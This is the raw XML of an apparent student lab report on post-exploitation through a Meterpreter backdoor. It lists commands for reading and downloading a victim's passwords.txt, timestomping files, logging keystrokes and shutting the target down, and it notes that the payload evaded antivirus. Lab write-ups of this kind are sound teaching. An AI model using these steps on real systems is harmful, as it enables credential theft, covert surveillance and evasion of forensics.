      <w:r w:rsidR="00E93965" w:rsidRPr="007932EA">
        <w:t>. View Contents of passwords.txt.tx</w:t>
      </w:r>
      <w:r w:rsidR="00D2631C" w:rsidRPr="007932EA">
        <w:t>t</w:t>
      </w:r>
      <w:r w:rsidR="00D2631C" w:rsidRPr="007932EA">
        <w:br/>
        <w:t>Command: cat passwords.txt</w:t>
      </w:r>
      <w:r w:rsidR="00DA5795">
        <w:br/>
      </w:r>
      <w:r w:rsidR="00DA5795" w:rsidRPr="007932EA">
        <w:t>Download File to Kali</w:t>
      </w:r>
      <w:r w:rsidR="00DA5795" w:rsidRPr="007932EA">
        <w:br/>
        <w:t>Command: download passwords.txt.txt</w:t>
      </w:r>
      <w:r w:rsidR="00DA5795">
        <w:br/>
        <w:t xml:space="preserve">Screenshot: </w:t>
      </w:r>
      <w:r w:rsidR="00DA5795">
        <w:br/>
      </w:r>
      <w:r w:rsidR="00DA5795">
        <w:br/>
      </w:r>
      <w:r w:rsidR="00DA5795">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="5055235" cy="1821767"/>
            <wp:effectExtent l="0" t="0" r="0" b="7620"/>
            <wp:docPr id="31" name="Picture 31" descr="C:\Users\DELL\Downloads\SendAnywhere_178677\15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DELL\Downloads\SendAnywhere_178677\15th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270" cy="1830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892" w:rsidRPr="007932EA" w:rsidRDefault="00E35892" w:rsidP="00DA579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DA5795" w:rsidRDefault="003A37CC" w:rsidP="00DA5795">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r w:rsidR="00E93965" w:rsidRPr="007932EA">
        <w:t xml:space="preserve">. View File Timestamps </w:t>
      </w:r>
      <w:r w:rsidR="00E93965" w:rsidRPr="007932EA">
        <w:t>(MACE)</w:t>
      </w:r>
      <w:r w:rsidR="00E93965" w:rsidRPr="007932EA">
        <w:br/>
        <w:t>Comm</w:t>
      </w:r>
      <w:r w:rsidR="00D2631C" w:rsidRPr="007932EA">
        <w:t xml:space="preserve">and: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00D2631C" w:rsidRPr="007932EA">
        <w:t>timestomp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00D2631C" w:rsidRPr="007932EA">
        <w:t xml:space="preserve"> passwords.txt</w:t>
      </w:r>
      <w:r w:rsidR="00DA5795">
        <w:t xml:space="preserve"> -v</w:t>
      </w:r>
      <w:r w:rsidR="00DA5795">
        <w:br/>
        <w:t xml:space="preserve">Screenshot: </w:t>
      </w:r>
      <w:r w:rsidR="00DA5795">
        <w:br/>
      </w:r>
      <w:r w:rsidR="00DA5795">
        <w:br/>
      </w:r>
      <w:r w:rsidR="00DA5795">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="3847514" cy="1177925"/>
            <wp:effectExtent l="0" t="0" r="635" b="3175"/>
            <wp:docPr id="32" name="Picture 32" descr="C:\Users\DELL\Downloads\SendAnywhere_178677\18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:\Users\DELL\Downloads\SendAnywhere_178677\18th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347" cy="1186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892" w:rsidRPr="007932EA" w:rsidRDefault="00E35892" w:rsidP="00DA579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DA5795" w:rsidRDefault="003A37CC" w:rsidP="00DA5795">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>f</w:t>
      </w:r>
      <w:r w:rsidR="00E93965" w:rsidRPr="007932EA">
        <w:t>. Start and Dump Keystrokes</w:t>
      </w:r>
      <w:r w:rsidR="00E93965" w:rsidRPr="007932EA">
        <w:br/>
        <w:t xml:space="preserve">Command: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00E93965" w:rsidRPr="007932EA">
        <w:t>keyscan_s</w:t>
      </w:r>
      <w:r w:rsidR="00DA5795">
        <w:t>tart</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00DA5795">
        <w:t xml:space="preserve"> → </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00DA5795">
        <w:t>keyscan_dump</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00DA5795">
        <w:br/>
        <w:t>Screenshot:</w:t>
      </w:r>
      <w:r w:rsidR="00DA5795">
        <w:br/>
      </w:r>
      <w:r w:rsidR="00DA5795">
        <w:br/>
      </w:r>
      <w:r w:rsidR="00DA5795">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="6042025" cy="1589649"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="33" name="Picture 33" descr="C:\Users\DELL\Downloads\SendAnywhere_178677\19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Users\DELL\Downloads\SendAnywhere_178677\19th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457" cy="16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892" w:rsidRPr="007932EA" w:rsidRDefault="00E35892" w:rsidP="00DA579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DA5795" w:rsidRDefault="003A37CC" w:rsidP="00DA5795">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>g.</w:t>
      </w:r>
      <w:r w:rsidR="00E93965" w:rsidRPr="007932EA">
        <w:t>Check</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00E93965" w:rsidRPr="007932EA">
        <w:t xml:space="preserve"> User Idle</w:t>
      </w:r>
      <w:r w:rsidR="00E93965" w:rsidRPr="007932EA">
        <w:t xml:space="preserve"> Time</w:t>
      </w:r>
      <w:r w:rsidR="00DA5795">
        <w:br/>
        <w:t xml:space="preserve">Command: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00DA5795">
        <w:t>idletime</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00DA5795">
        <w:br/>
        <w:t xml:space="preserve">Screenshot: </w:t>
      </w:r>
      <w:r w:rsidR="00DA5795">
        <w:br/>
      </w:r>
      <w:r w:rsidR="00DA5795">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="3165231" cy="506730"/>
            <wp:effectExtent l="0" t="0" r="0" b="7620"/>
            <wp:docPr id="34" name="Picture 34" descr="C:\Users\DELL\Downloads\SendAnywhere_178677\Screenshot_2025-07-26_17-55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Users\DELL\Downloads\SendAnywhere_178677\Screenshot_2025-07-26_17-55-47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288" cy="51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892" w:rsidRPr="007932EA" w:rsidRDefault="00E35892" w:rsidP="00DA579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DA5795" w:rsidRDefault="003A37CC" w:rsidP="00DA5795">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r w:rsidR="00E93965" w:rsidRPr="007932EA">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>. Shutdown Victim Machine</w:t>
      </w:r>
      <w:r w:rsidR="00DA5795">
        <w:br/>
        <w:t>Command: shutdown</w:t>
      </w:r>
      <w:r w:rsidR="00DA5795">
        <w:br/>
        <w:t xml:space="preserve">Screenshot: </w:t>
      </w:r>
      <w:r w:rsidR="00DA5795">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="00DA5795">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidR="00DA5795">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="5240020" cy="640080"/>
            <wp:effectExtent l="0" t="0" r="0" b="7620"/>
            <wp:docPr id="35" name="Picture 35" descr="C:\Users\DELL\Downloads\SendAnywhere_178677\20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DELL\Downloads\SendAnywhere_178677\20th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892" w:rsidRPr="007932EA" w:rsidRDefault="00E35892" w:rsidP="00DA579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E35892" w:rsidRPr="003A37CC" w:rsidRDefault="00E93965">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="auto"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003A37CC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t>8. Notes / Observations</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="007932EA" w:rsidRPr="007932EA" w:rsidRDefault="007932EA" w:rsidP="007932EA">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007932EA">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>- Antivirus initially flagged the payload but it was still executable.</w:t>
      </w:r>
      <w:r w:rsidRPr="007932EA">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>- Meterpreter session provided full control of the target.</w:t>
      </w:r>
      <w:r w:rsidRPr="007932EA">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">- Keystroke logging and </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="007932EA">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>timestomp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="007932EA">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> were successful in data exfiltration and stealth.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00E35892" w:rsidRPr="003A37CC" w:rsidRDefault="00E93965">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="auto"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003A37CC">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="auto"/>
        </w:rPr>
        <w:t>9. Conclusion</w:t>
      </w:r>
      <w:bookmarkStart w:id="0" w:name="_GoBack"/>
      <w:bookmarkEnd w:id="0"/>
    </w:p>
    <w:p w:rsidR="00E518FA" w:rsidRPr="007932EA" w:rsidRDefault="00E518FA" w:rsidP="00E518FA">
      <w:pPr>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007932EA">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>This practical execution showcases how vulnerable a system can become once a backdoor is delivered and executed. Meterpreter provides a powerful suite of tools for attackers to operate covertly and efficiently. This exercise reinforces the importance of endpoint protection, user awareness, and network monitoring.</w:t>
      </w:r>
    </w:p>
    <w:sectPr w:rsidR="00E518FA" w:rsidRPr="007932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965" w:rsidRDefault="00E93965" w:rsidP="00DA5795">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:endnote>
  <w:endnote w:type="continuationSeparator" w:id="0">
    <w:p w:rsidR="00E93965" w:rsidRDefault="00E93965" w:rsidP="00DA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965" w:rsidRDefault="00E93965" w:rsidP="00DA5795">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:footnote>
  <w:footnote w:type="continuationSeparator" w:id="0">
    <w:p w:rsidR="00E93965" w:rsidRDefault="00E93965" w:rsidP="00DA57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E63997"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="42B6A9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EA0380"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="D076E6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E558F"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="3296EC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83438D"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="F21E1D5A"/>
    <w:lvl w:ilvl="0" w:tplc="513A75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740989"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="21E4A8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61003E"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="164A84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586438"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="31A02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050FB8"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="954ACD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472843"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="A954AA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2"/>
  </w:num>
  <w:num w:numId="12">
    <w:abstractNumId w:val="17"/>
  </w:num>
  <w:num w:numId="13">
    <w:abstractNumId w:val="9"/>
  </w:num>
  <w:num w:numId="14">
    <w:abstractNumId w:val="13"/>
  </w:num>
  <w:num w:numId="15">
    <w:abstractNumId w:val="11"/>
  </w:num>
  <w:num w:numId="16">
    <w:abstractNumId w:val="14"/>
  </w:num>
  <w:num w:numId="17">
    <w:abstractNumId w:val="1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7CC"/>
    <w:rsid w:val="007932EA"/>
    <w:rsid w:val="00AA1D8D"/>
    <w:rsid w:val="00AC1B24"/>
    <w:rsid w:val="00B47730"/>
    <w:rsid w:val="00CB0664"/>
    <w:rsid w:val="00D2631C"/>
    <w:rsid w:val="00D95B85"/>
    <w:rsid w:val="00DA5795"/>
    <w:rsid w:val="00E35892"/>
    <w:rsid w:val="00E518FA"/>
    <w:rsid w:val="00E939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9F9F34"/>
  <w14:defaultImageDpi w14:val="300"/>
  <w15:docId w15:val="{2E86E922-741E-40A1-864D-2A7479D6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95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6FEF59-C133-4611-8FF0-AD57CE5CA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2025-07-26T14:28:00Z</dcterms:modified>
  <cp:category/>
</cp:coreProperties>
</file>